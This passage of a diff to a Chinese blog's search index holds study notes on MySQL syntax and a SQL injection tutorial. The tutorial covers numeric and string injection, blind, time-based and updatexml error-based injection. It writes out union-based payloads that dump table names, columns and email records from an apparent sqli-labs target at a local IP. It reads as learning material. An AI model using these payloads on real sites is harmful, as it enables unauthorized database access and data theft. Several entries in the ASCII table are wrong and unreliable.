+<li>MongoDB数据库，默认端口号: 27017;</li>
+</ol>
+<h2 id="2-SQL"><a href="#2-SQL" class="headerlink" title="2. SQL"></a>2. SQL</h2><p><strong>SQL</strong> (Structured Query Language:结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。 SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</p>
+<h3 id="2-1-SQL通用语法"><a href="#2-1-SQL通用语法" class="headerlink" title="2.1 SQL通用语法"></a>2.1 SQL通用语法</h3><p>1). SQL语句可以单行或多行书写，以分号结尾。 </p>
+<p>2). SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。 </p>
+<p>3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。 </p>
+<p>4). 注释： </p>
+<p>单行注释：– 注释内容或 # 注释内容 </p>
+<p>多行注释：&#x2F;* 注释内容 *&#x2F;</p>
+<p><strong>一些最重要的 SQL 命令</strong></p>
+<ul>
+<li><strong>SELECT</strong> - 从数据库中提取数据</li>
+<li><strong>UPDATE</strong> - 更新数据库中的数据</li>
+<li><strong>DELETE</strong> - 从数据库中删除数据</li>
+<li><strong>INSERT INTO</strong> - 向数据库中插入新数据</li>
+<li><strong>CREATE DATABASE</strong> - 创建新数据库</li>
+<li><strong>ALTER DATABASE</strong> - 修改数据库</li>
+<li><strong>CREATE TABLE</strong> - 创建新表</li>
+<li><strong>ALTER TABLE</strong> - 变更（改变）数据库表</li>
+<li><strong>DROP TABLE</strong> - 删除表</li>
+<li><strong>CREATE INDEX</strong> - 创建索引（搜索键）</li>
+<li><strong>DROP INDEX</strong> - 删除索引</li>
+</ul>
+<h3 id="常用数据库语句"><a href="#常用数据库语句" class="headerlink" title="常用数据库语句"></a>常用数据库语句</h3><p><code>show databases:</code><br>列出mysq1数据库管理系统的数据列表</p>
+<p><img src="C:\Users\91481\AppData\Roaming\Typora\typora-user-images\image-20230811093727023.png" alt="image-20230811093727023"></p>
+<p>use 数据库名<br>选择需要操作的数据库，使用该命令后所有的Mysql命令都只针对该数据库</p>
+<p><img src="C:\Users\91481\AppData\Roaming\Typora\typora-user-images\image-20230811093745696.png" alt="image-20230811093745696"></p>
+<p>创建数据库<br><code>create database database_name;</code></p>
+<p><img src="C:\Users\91481\AppData\Roaming\Typora\typora-user-images\image-20230811093914728.png" alt="image-20230811093914728"></p>
+<p><code>show tables;</code><br>显示指定数据库的所有表，使用该命令前需要使用use命令来选择要操作的数据库</p>
+<p><img src="C:\Users\91481\AppData\Roaming\Typora\typora-user-images\image-20230811093949250.png" alt="image-20230811093949250"></p>
+<p><code>show columns from</code> 数据表  <code>desc table_name;</code>显示数据表的属性，属性类型，主键信息，是否为NULL，默认值等其他信息</p>
+<p><img src="C:\Users\91481\AppData\Roaming\Typora\typora-user-images\image-20230811094120125.png" alt="image-20230811094120125"></p>
+<p><code>Field</code>:列名;<br><code>Type</code>:数据类型;<br><code>Nu11</code>:是否能取空值;<br><code>Key: PRI</code>(主键)、MUL(普通的b-tree索引)、UNI(唯一索引);<br><code>Default</code>:默认值;<br><code>Extra</code>:其他信息。</p>
+<p>创建数据表</p>
+<p><img src="C:\Users\91481\AppData\Roaming\Typora\typora-user-images\image-20230811095216552.png" alt="image-20230811095216552"></p>
+<p><code>If not exists</code>:判断表是否存在，如果存在，不会报错，也会执行成功。</p>
+<p><code>int unsigned</code>:无符号类型。无符号数，都解释为正数。</p>
+<p><code>auto_increment</code>:自动递增，默认开始值为1。也可以自己定义，auto increment&#x3D;100。</p>
+<p><code>engine=InnoDB</code>:指定存储引警</p>
+<p><strong>插入语句</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into table_name(fieldl, field2,...fieldN)</span><br><span class="line">Valu</span><br><span class="line">(valuel, value2,...valueN);</span><br></pre></td></tr></table></figure>
+
+<p><strong>查询语句</strong> <code>select *from table_name;</code></p>
+<p><strong>where子句</strong><br>类似于程序语言中的if条件，根据mysql表中的字段值来读取指定的数据</p>
+<p>where的字符串比较是不区分大小写的。可以使用where binary关键子来设定where子句的字符串比较是区分大小写的。</p>
+<p><strong>update更新</strong><br><code>update teble_name set fieldl=new-valuel，field2=new-value2;</code></p>
+<p><strong>删除数据库</strong><br><code>drop database database_name;</code></p>
+<p><strong>like子句</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select field1，field2,...fieldN</span><br><span class="line"></span><br><span class="line">from table_name</span><br><span class="line"></span><br><span class="line">where fieldl like condition1 [AND [OR]] filed2 =&#x27;somevalue&#x27;</span><br><span class="line"></span><br><span class="line">select * from student_tb WHERE stu_name LIKE &#x27;王%&#x27; and stu_age like&#x27;1%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>你可以在 WHERE 子句中指定任何条件</p>
+<p>你可以在 WHERE子句中使用LIKE子句</p>
+<p>你可以使用LIKE子句代替等号&#x3D;。</p>
+<p>LIKE 通常与 %一同使用，类似于一个元字符的搜索。</p>
+<p>你可以使用 AND或者 OR 指定一个或多个条件。</p>
+<p>你可以在 DELETE 或 UPDATE 命令中使用 WHERE…LIKE子来指定条件</p>
+<p><strong>union子句</strong><br>union操作符用于连接两个以上的select语句的结果组合到一个结果集合中多个select语句会删除重复的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select expression1, expression2,expression_n...</span><br><span class="line"></span><br><span class="line">from table1</span><br><span class="line"></span><br><span class="line">where conditions</span><br><span class="line"></span><br><span class="line">union [all|distonct]</span><br><span class="line"></span><br><span class="line">select expression1, expression2,expression_n...</span><br><span class="line"></span><br><span class="line">FROM table2</span><br><span class="line"></span><br><span class="line">WHERE conditions ;</span><br></pre></td></tr></table></figure>
+
+<p>expression1, expression2,… expression n: 要检索的列。</p>
+<p>tables:要检索的数据表。<br>WHERE conditions:可选，检索条件。</p>
+<p>DISTINCT: 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。<br>ALL: 可选，返回所有结果集，包含重复数据</p>
+<p><strong>alter命令</strong><br>ALTER 命令非常强大，可以在数据库结构发生变化时进行灵活的修改和调整<br>当我们需要修改数据表名或者修改数据表字段时，就需要使用到 MySQL ALTER 命令。<br>MySQL 的 ALTER 命令用于修改数据库、表和索引等对象的结构。<br>ALTER 命令允许你添加、修改或删除数据库对象，并且可以用于更改表的列定义、添<br>加约束、创建和删除索引等操作。</p>
+<p>如添加新列:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table table_name</span><br><span class="line">add column_ name data_type;</span><br></pre></td></tr></table></figure>
+
+<p><strong>order by 子句</strong><br>如果我们需要对读取的数据进行排序，我们就可以使用order by子句来设定你想按哪个字段哪种方式来进行排序，再返回搜索结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select field1， field2,...fieldN from table_name1, table_name2....</span><br><span class="line">order by field1 [ASC [DESC][默认 ASC]]</span><br></pre></td></tr></table></figure>
+
+<p><strong>group by 子句</strong></p>
+<p>group by 语句根据一个或多个列对结果集进行分组</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column name, function(column name)</span><br><span class="line">FROM table name</span><br><span class="line">WHERE column name operator value</span><br><span class="line">GROUP BY column name;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>比较运算符</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&gt;</td>
+<td>大于</td>
+</tr>
+<tr>
+<td>&gt;&#x3D;</td>
+<td>大于等于</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>小于</td>
+</tr>
+<tr>
+<td>&lt;&#x3D;</td>
+<td>小于等于</td>
+</tr>
+<tr>
+<td>&#x3D;</td>
+<td>等于</td>
+</tr>
+<tr>
+<td>&lt;&gt; 或 !&#x3D;</td>
+<td>不等于</td>
+</tr>
+<tr>
+<td>BETWEEN … AND …</td>
+<td>在某个范围内（含最小、最大值）</td>
+</tr>
+<tr>
+<td>IN(…)</td>
+<td>在in之后的列表中的值，多选一</td>
+</tr>
+<tr>
+<td>LIKE 占位符</td>
+<td>模糊匹配（_匹配单个字符，%匹配任意个字符）</td>
+</tr>
+<tr>
+<td>IS NULL</td>
+<td>是NULL</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>逻辑运算符</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AND 或 &amp;&amp;</td>
+<td>并且（多个条件同时成立）</td>
+</tr>
+<tr>
+<td>OR 或 &#124;&#124;</td>
+<td>或者（多个条件任意一个成立）</td>
+</tr>
+<tr>
+<td>NOT 或 !</td>
+<td>非，不是</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>Wed安全</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞</title>
+    <url>/2023/08/21/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。</p>
+<span id="more"></span>
+<ul>
+<li><strong>SQL注入攻击</strong>是目前web应用网络攻击中最常见的手段之一，曾被冠以 “<strong>漏洞之王</strong>” 的称号，其安全风险高于缓冲区溢出漏洞等所有其他漏洞，而市场上的防火墙又不能对SQL注入漏洞进行有效的检测和防范。</li>
+<li>SQL注入攻击普遍存在<strong>范围广</strong>、<strong>实现容易</strong>、<strong>破坏性大</strong>等特点。</li>
+</ul>
+<p><strong>结构化查询语言</strong>（Structured Query Language）简称 <strong>SQL</strong>，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p>
+<p><strong>SQL注入</strong>即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中<strong>事先定义好的查询语句的结尾</strong>后，<strong>添加额外的SQL语句</strong>，在管理员不知情的情况下实现<strong>非法操作</strong>，以此来实现欺骗数据库服务器执行<strong>非授权的任意查询</strong>，从而进一步得到相应的数据信息。</p>
+<p>简单来讲就是：<strong>攻击者通过构造不同的SQL语句来实现对数据库的操作</strong>。<br>此处<strong>两个关键条件</strong>：</p>
+<ul>
+<li><p><strong>参数</strong>用户可控 —— 即用户能够控制数据的输入</p>
+</li>
+<li><p>我们构造的参数可<strong>带入数据库执行</strong> —— 原本要执行的代码，<strong>拼接</strong>了用户的输入</p>
+</li>
+</ul>
+<p><strong>sql 注入的核心</strong></p>
+<p>  <strong>将用户输入的数据拼接到代码中，并被当成 sql 语句执行。</strong></p>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>通常sql 注入漏洞会被分为2种类型</p>
+<blockquote>
+<p>数字型<br>字符型</p>
+</blockquote>
+<h2 id="如何区分"><a href="#如何区分" class="headerlink" title="如何区分"></a>如何区分</h2><h3 id="1）数字型"><a href="#1）数字型" class="headerlink" title="1）数字型"></a>1）数字型</h3><p>当输入的参数x为整型的时候，通常<a href="https://so.csdn.net/so/search?q=sql%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">sql语句</a>是这样的</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =x</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这种类型可以使用经典的and 1&#x3D;1 and 1&#x3D;2来判断</p>
+</blockquote>
+<ul>
+<li>url地址中输入<a href="http://www.xxxx.com/ccc.php?id=x">www.xxxx.com/ccc.php?id=x</a> and 1&#x3D;1<br>页面显示正常，继续下一步</li>
+<li>url地址中输入<a href="http://www.xxxx.com/ccc.php?id=x">www.xxxx.com/ccc.php?id=x</a> and 1&#x3D;2<br>页面错误，这说明存在数字型注入。</li>
+<li>原因如下：<br>当输入and 1&#x3D;1时，后台会执行sql语句是</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>；</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>没有语法显示错误且，返回正常</p>
+<p>当输入and 1&#x3D;2时，后台会执行sql语句是</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>没有语法错误且，返回错误</p>
+<ul>
+<li>我们在使用假设：<br>如果是字符型注入的话，我们输入的语句应该会出现这样的状况</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =<span class="string">&#x27;1 and 1=1&#x27;</span>; </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =<span class="string">&#x27;1 and 1=2&#x27;</span>;</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p>查询语句将and语句全部转换成字符串，并没有进行and的逻辑判断，所以不会出现以上结果，所以这个等式是不成立的。</p>
+<h3 id="2）字符型"><a href="#2）字符型" class="headerlink" title="2）字符型"></a>2）字符型</h3><p>当输入的参数x为字符型时，通常sql语句会这样的</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =<span class="string">&#x27;x&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这种类型我们可以使用and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来进行测试</p>
+</blockquote>
+<ul>
+<li><a href="http://www.xxx.com/ccc.php?id=1%E2%80%99">www.xxx.com/ccc.php?id=1’</a> and ‘1’&#x3D;’1<br>页面正常，继续下一步</li>
+<li><a href="http://www.xxx.com/ccc.php?id=1%E2%80%99">www.xxx.com/ccc.php?id=1’</a> and ‘1’&#x3D;’2<br>页面报错，则说明存在字符型注入。</li>
+<li>原因如下：<br>当输入and ‘1’&#x3D;‘1的时候，后台执行的语句是</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>语法正确，逻辑判断正确，返回正确</p>
+<p>当输入and ‘1’&#x3D;‘2的时候，后台执行的语句是</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>语法正确，逻辑判断错误，返回错误</p>
+<p>字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<h2 id="SQL-Injection函数"><a href="#SQL-Injection函数" class="headerlink" title="SQL Injection函数"></a>SQL Injection函数</h2><table>
+<thead>
+<tr>
+<th><strong>函数</strong> <strong>&#x2F;</strong> <strong>语句</strong></th>
+<th><strong>功能</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>user()</td>
+<td>当前用户名</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>当前所用数据库</td>
+</tr>
+<tr>
+<td>current_user()</td>
+<td>当前用户名（可用来查看权限）</td>
+</tr>
+<tr>
+<td>version()</td>
+<td>数据库的版本</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库的路径</td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>操作系统版本</td>
+</tr>
+<tr>
+<td>into dumpfile</td>
+<td>写文件操作</td>
+</tr>
+<tr>
+<td>into outfile</td>
+<td>写文件</td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>读文件操作</td>
+</tr>
+<tr>
+<td>concat(str1,str2..)</td>
+<td>连接字符串，连接两个或多个数组</td>
+</tr>
+<tr>
+<td>group_concat(str1,str2..)</td>
+<td>连接字符串，能将相同的行组合起来</td>
+</tr>
+<tr>
+<td>length（）</td>
+<td>计算字符串长度</td>
+</tr>
+<tr>
+<td>hex（）</td>
+<td>字符转换为16进制</td>
+</tr>
+<tr>
+<td>ord()</td>
+<td>字符转换为ASCII值</td>
+</tr>
+</tbody></table>
+<h2 id="information-schema库"><a href="#information-schema库" class="headerlink" title="information_schema库"></a>information_schema库</h2><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230812094610274.png" alt="image-20230812094610274"></p>
+<h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><ul>
+<li>union操作符用于合并两个或多个select语句的结果集。</li>
+<li>联合查询中合并的选择查询必须具有相同的输出字段数、采用相同的顺序并包含相同或兼容的数据类型。</li>
+</ul>
+<h3 id="order-by语句"><a href="#order-by语句" class="headerlink" title="order by语句"></a>order by语句</h3><ul>
+<li>ORDER BY 语句用于根据指定的列对结果集进行排序。（判断列数）</li>
+<li>ORDER BY 语句默认按照升序对记录进行排序。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断注入点：</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=1&#x27; and 1=2-- -</span><br><span class="line">猜字段数：</span><br><span class="line">order by(二分法)</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; order by 3-- -</span><br><span class="line">找回显：</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; union select 1,2,3-- -</span><br><span class="line">找数据库</span><br><span class="line">database()</span><br><span class="line"></span><br><span class="line">group_concat()</span><br><span class="line">找表名字</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(table_name),@@basedir  from information_schema.tables where table_schema=&quot;security&quot;-- -</span><br><span class="line">找字段名</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(column_name),@@basedir  from information_schema.columns where table_name=&quot;emails&quot;-- -</span><br><span class="line">爆记录</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(id,email_id),3  from emails-- -</span><br><span class="line">查看内容</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(id),group_concat(email_id)  from emails-- -</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="bool注入"><a href="#bool注入" class="headerlink" title="bool注入"></a>bool注入</h2><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230812095315721.png" alt="image-20230812095315721"></p>
+<h3 id="substring函数"><a href="#substring函数" class="headerlink" title="substring函数"></a>substring函数</h3><p>截取字符串的长度</p>
+<p>substring(字段名,A, N)，这个函数是用来截取()里的字段从第A个长度起往后截取N个字，比如substring(username,1,2)就表示从username字段中从第1个字符向后截取2位，包括第1个字符，比如值为admin，截取的就是ad。</p>
+<h3 id="ascii函数"><a href="#ascii函数" class="headerlink" title="ascii函数"></a>ascii函数</h3><p>ascii(‘a’) ，返回a字母的ascii码97</p>
+<table>
+<thead>
+<tr>
+<th align="center">ASCII值</th>
+<th align="center">控制字符</th>
+<th align="center">ASCII值</th>
+<th align="center">控制字符</th>
+<th align="center">ASCII值</th>
+<th align="center">控制字符</th>
+<th align="center">ASCII值</th>
+<th align="center">控制字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">NUT</td>
+<td align="center">32</td>
+<td align="center">(space)</td>
+<td align="center">64</td>
+<td align="center">@</td>
+<td align="center">96</td>
+<td align="center">、</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">SOH</td>
+<td align="center">33</td>
+<td align="center">!</td>
+<td align="center">65</td>
+<td align="center">A</td>
+<td align="center">97</td>
+<td align="center">a</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">STX</td>
+<td align="center">34</td>
+<td align="center">“</td>
+<td align="center">66</td>
+<td align="center">B</td>
+<td align="center">98</td>
+<td align="center">b</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">ETX</td>
+<td align="center">35</td>
+<td align="center">#</td>
+<td align="center">67</td>
+<td align="center">C</td>
+<td align="center">99</td>
+<td align="center">c</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">EOT</td>
+<td align="center">36</td>
+<td align="center">$</td>
+<td align="center">68</td>
+<td align="center">D</td>
+<td align="center">100</td>
+<td align="center">d</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">ENQ</td>
+<td align="center">37</td>
+<td align="center">%</td>
+<td align="center">69</td>
+<td align="center">E</td>
+<td align="center">101</td>
+<td align="center">e</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="center">ACK</td>
+<td align="center">38</td>
+<td align="center">&amp;</td>
+<td align="center">70</td>
+<td align="center">F</td>
+<td align="center">102</td>
+<td align="center">f</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td align="center">BEL</td>
+<td align="center">39</td>
+<td align="center">,</td>
+<td align="center">71</td>
+<td align="center">G</td>
+<td align="center">103</td>
+<td align="center">g</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td align="center">BS</td>
+<td align="center">40</td>
+<td align="center">(</td>
+<td align="center">72</td>
+<td align="center">H</td>
+<td align="center">104</td>
+<td align="center">h</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td align="center">HT</td>
+<td align="center">41</td>
+<td align="center">)</td>
+<td align="center">73</td>
+<td align="center">I</td>
+<td align="center">105</td>
+<td align="center">i</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td align="center">LF</td>
+<td align="center">42</td>
+<td align="center">*</td>
+<td align="center">74</td>
+<td align="center">J</td>
+<td align="center">106</td>
+<td align="center">j</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td align="center">VT</td>
+<td align="center">43</td>
+<td align="center">+</td>
+<td align="center">75</td>
+<td align="center">K</td>
+<td align="center">107</td>
+<td align="center">k</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td align="center">FF</td>
+<td align="center">44</td>
+<td align="center">,</td>
+<td align="center">76</td>
+<td align="center">L</td>
+<td align="center">108</td>
+<td align="center">l</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td align="center">CR</td>
+<td align="center">45</td>
+<td align="center">-</td>
+<td align="center">77</td>
+<td align="center">M</td>
+<td align="center">109</td>
+<td align="center">m</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td align="center">SO</td>
+<td align="center">46</td>
+<td align="center">.</td>
+<td align="center">78</td>
+<td align="center">N</td>
+<td align="center">110</td>
+<td align="center">n</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td align="center">SI</td>
+<td align="center">47</td>
+<td align="center">&#x2F;</td>
+<td align="center">79</td>
+<td align="center">O</td>
+<td align="center">111</td>
+<td align="center">o</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td align="center">DLE</td>
+<td align="center">48</td>
+<td align="center">0</td>
+<td align="center">80</td>
+<td align="center">P</td>
+<td align="center">112</td>
+<td align="center">p</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td align="center">DCI</td>
+<td align="center">49</td>
+<td align="center">1</td>
+<td align="center">81</td>
+<td align="center">Q</td>
+<td align="center">113</td>
+<td align="center">q</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td align="center">DC2</td>
+<td align="center">50</td>
+<td align="center">2</td>
+<td align="center">82</td>
+<td align="center">R</td>
+<td align="center">114</td>
+<td align="center">r</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td align="center">DC3</td>
+<td align="center">51</td>
+<td align="center">3</td>
+<td align="center">83</td>
+<td align="center">S</td>
+<td align="center">115</td>
+<td align="center">s</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td align="center">DC4</td>
+<td align="center">52</td>
+<td align="center">4</td>
+<td align="center">84</td>
+<td align="center">T</td>
+<td align="center">116</td>
+<td align="center">t</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td align="center">NAK</td>
+<td align="center">53</td>
+<td align="center">5</td>
+<td align="center">85</td>
+<td align="center">U</td>
+<td align="center">117</td>
+<td align="center">u</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td align="center">SYN</td>
+<td align="center">54</td>
+<td align="center">6</td>
+<td align="center">86</td>
+<td align="center">V</td>
+<td align="center">118</td>
+<td align="center">v</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td align="center">TB</td>
+<td align="center">55</td>
+<td align="center">7</td>
+<td align="center">87</td>
+<td align="center">W</td>
+<td align="center">119</td>
+<td align="center">w</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td align="center">CAN</td>
+<td align="center">56</td>
+<td align="center">8</td>
+<td align="center">88</td>
+<td align="center">X</td>
+<td align="center">120</td>
+<td align="center">x</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td align="center">EM</td>
+<td align="center">57</td>
+<td align="center">9</td>
+<td align="center">89</td>
+<td align="center">Y</td>
+<td align="center">121</td>
+<td align="center">y</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td align="center">SUB</td>
+<td align="center">58</td>
+<td align="center">:</td>
+<td align="center">90</td>
+<td align="center">Z</td>
+<td align="center">122</td>
+<td align="center">z</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td align="center">ESC</td>
+<td align="center">59</td>
+<td align="center">;</td>
+<td align="center">91</td>
+<td align="center">[</td>
+<td align="center">123</td>
+<td align="center">{</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td align="center">FS</td>
+<td align="center">60</td>
+<td align="center">&lt;</td>
+<td align="center">92</td>
+<td align="center">&#x2F;</td>
+<td align="center">124</td>
+<td align="center">|</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td align="center">GS</td>
+<td align="center">61</td>
+<td align="center">&#x3D;</td>
+<td align="center">93</td>
+<td align="center">]</td>
+<td align="center">125</td>
+<td align="center">}</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td align="center">RS</td>
+<td align="center">62</td>
+<td align="center">&gt;</td>
+<td align="center">94</td>
+<td align="center">^</td>
+<td align="center">126</td>
+<td align="center">&#96;</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td align="center">US</td>
+<td align="center">63</td>
+<td align="center">?</td>
+<td align="center">95</td>
+<td align="center">_</td>
+<td align="center">127</td>
+<td align="center">DEL</td>
+</tr>
+</tbody></table>
+<h2 id="sleep注入"><a href="#sleep注入" class="headerlink" title="sleep注入"></a>sleep注入</h2><p>sleep注入又是另一种形式的盲注，与bool注入不同，sleep注入没有任何报错信息输出，页面返回不管对或者错都是一种状态，攻击者无法通过页面返回状态来判断输入的SQL注入测试语句是否正确，只能通过构造sleep注入的SQL测试语句，通过页面的返回时间，从而判断数据库中的存储了哪些信息。</p>
+<h3 id="if函数"><a href="#if函数" class="headerlink" title="if函数"></a>if函数</h3><p>IF(expr1,expr2,expr3) 效果类似于编程语言中常见的三元运算符。<br>如果expr1为真（不等于0且不等于null），返回expr2，否则返回expr3。</p>
+<p>sleep() 执行挂起一段时间。<br>IF(expr1,expr2,expr3) 效果类似于编程语言中常见的三元运算符。<br>如果expr1为真（不等于0且不等于null），返回expr2，否则返回expr3。</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用数据库的语法特性，人为的制造错误，将想要查询的<br>数据信息通过数据库报错显示到前端达到注入的目的。</p>
+<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p>updatexml注入也是一种报错注入，是利用了updatexml函数中第二个参数XPath_string的报错进行注入。XPath_string正常的格式是xml路径，格式是&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;，如果格式不正确就会报错，updatexml注入就是利用了XPath_string的报错进行注入。</p>
+<p>MySQL在5.1.5版本中添加了对XML文档进行操作的两个函数，可以对XML文档进行查询和修改，extractValue()可以对XML文档进行查询和updateXML()可以对XML文档进行更新。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，目标XML文档。</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)，xml路径，正常的格式是</span><br><span class="line">/xxx/xxx/xxx/，如果格式不正确就会报错，updatexml注入就是利用了XPath_string的报错    进行注入。</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据。</span><br></pre></td></tr></table></figure>
+
